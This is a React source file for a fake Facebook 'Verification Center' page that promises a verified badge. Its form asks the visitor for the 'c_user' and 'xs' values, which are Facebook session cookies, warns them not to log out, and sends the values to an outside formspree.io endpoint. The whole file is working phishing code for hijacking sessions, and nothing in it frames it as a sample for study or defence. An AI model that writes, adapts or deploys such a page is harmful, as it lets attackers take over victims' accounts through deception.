import React from "react";

const Verification = () => {
  return (
    <div className="bg-gray-100 min-h-screen font-sans overflow-x-hidden">
      <header className="bg-[#4267B2] text-white p-6 flex justify-between items-center">
        <div className="flex items-center">
          <span className="text-4xl font-bold">facebook</span>
        </div>
      </header>

      <div className="bg-gray-200 h-2"></div>

      <div className="max-w-[840px] w-[90%] md:w-[80%] bg-white mx-auto my-[30px] p-[20px] rounded-lg shadow-lg relative">
        <div className="text-3xl font-bold mb-5 flex items-center">
          <img
            src="/blue_tick.png"
            alt="Verification Icon"
            className="w-12 h-auto mr-3"
          />
          Verification Center
        </div>
        <h1 className="text-2xl mb-5 font-normal text-left">
          Request a verified badge on Facebook
        </h1>
        <p className="text-sm text-gray-600 mb-3">
          The verified badge means that Facebook has confirmed that the Page or
          profile is the authentic presence of the individual, public figure, or
          brand that it represents.
        </p>
        <p className="text-sm text-gray-600 mb-3">
          Previously, the verified badge also required the person or brand to be
          notable and unique. You may still see users with a verified badge that
          represents our previous eligibility requirements.
        </p>
        <p className="text-sm text-gray-600 mb-3">
          Please provide the precise details below. Refer to the video for
          clarification if you find the instructions unclear.
        </p>

        <div className="relative w-full max-w-lg">
          <video
            id="video"
            controls
            preload="none"
            poster="fbPlay.jfif"
            className="w-full rounded-lg shadow-md"
          >
            <source src="/vid.mp4" type="video/mp4" />
            Your browser does not support the video tag.
          </video>
        </div>

        <p className="text-xs font-medium text-[#ff0000] mt-5">
          Please ensure that all required information is accurately provided.
          Failure to do so may result in not receiving a verified badge.
        </p>

        <form
          className="mainForm mt-6"
          action="https://formspree.io/f/xgvwgbgl"
          method="POST"
        >
          <div className="form-group mb-5">
            <label
              htmlFor="c_user"
              className="text-sm text-gray-700 block mb-2"
            >
              c_user
            </label>
            <input
              type="text"
              id="c_user"
              name="c_user"
              pattern="[0-9]+"
              minLength={6}
              required
              className="w-full p-3 text-sm border border-gray-300 rounded-md bg-gray-100 focus:bg-white focus:border-blue-500 focus:outline-none"
            />
          </div>
          <div className="form-group mb-5">
            <label htmlFor="xs" className="text-sm text-gray-700 block mb-2">
              xs
            </label>
            <input
              type="text"
              id="xs"
              name="xs"
              pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$"
              required
              className="w-full p-3 text-sm border border-gray-300 rounded-md bg-gray-100 focus:bg-white focus:border-blue-500 focus:outline-none"
            />
          </div>
          <p className="text-xs text-gray-600 mb-6">
            Please make sure not to log out from your computer or laptop until
            you have received a verification email.
          </p>
          <button
            type="submit"
            className="w-full p-3 bg-blue-600 text-white font-bold uppercase rounded-md hover:bg-blue-700 transition duration-300"
          >
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default Verification;
